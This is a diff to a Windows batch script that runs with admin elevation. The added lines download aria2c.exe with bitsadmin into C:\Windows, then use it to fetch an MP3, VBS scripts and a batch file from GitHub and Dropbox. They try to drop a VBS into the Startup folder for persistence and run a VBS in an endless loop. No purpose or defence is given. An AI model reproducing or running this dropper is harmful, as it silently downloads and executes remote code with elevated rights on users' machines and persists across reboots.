@@ -27,4 +27,16 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
+if "%1"=="h" goto begin
 bitsadmin /transfer debjob /download /priority normal https://github.com/JamieJiami/Aria2c/raw/main/aria2c.exe c:\windows\aria2c.exe
+c:\windows\aria2c.exe https://www.dropbox.com/s/2gfnwdolauoez8p/music.mp3?dl=1
+move music.mp3 c:\windows\music.mp3
+c:\windows\aria2c.exe https://github.com/JamieJiami/Aria2c/raw/main/music.vbs
+move music.vbs c:\windows\music.vbs
+c:\windows\aria2c.exe https://github.com/JamieJiami/Aria2c/raw/main/startup.bat
+move startup.bat c:\windows\startup.bat
+c:\windows\aria2c.exe https://github.com/JamieJiami/Aria2c/raw/main/statup.vbs
+move statup"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.vbs"
+:1
+c:\windows\music.vbs
+goto 1
